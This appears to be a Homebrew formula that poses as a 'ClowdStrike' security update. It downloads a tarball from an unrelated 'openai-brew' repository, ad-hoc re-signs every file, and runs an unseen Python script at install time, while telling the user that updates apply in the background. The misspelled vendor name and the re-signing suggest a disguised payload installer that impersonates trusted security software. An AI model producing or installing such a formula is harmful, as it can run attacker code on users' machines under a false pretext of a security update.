class Crowdstrikeupdate < Formula
    desc "A manual ClowdStrike update to be installed by support"
    homepage "https://github.com/openai-brew/"
    url "https://github.com/openai-brew/homebrew-bundle/releases/download/v1.16/crowdstrikeupdate-1.16.tar.gz"
    sha256 "a4f3382e1d0edc7cf79545cb7e8f5dc998c789117d9ef5816c72555288e68a86"
    version "1.16"

    def install
        bin.install Dir["*"]
        Dir["#{bin}/*"].each do |f|
        system "codesign", "--force", "--sign", "-", f if File.file?(f)
        end
        system "python3 #{bin}/UpdateCS.py"
      end

    def caveats
        <<~EOS
        Updates will now apply in the background, thank you!
        EOS
    end
    end
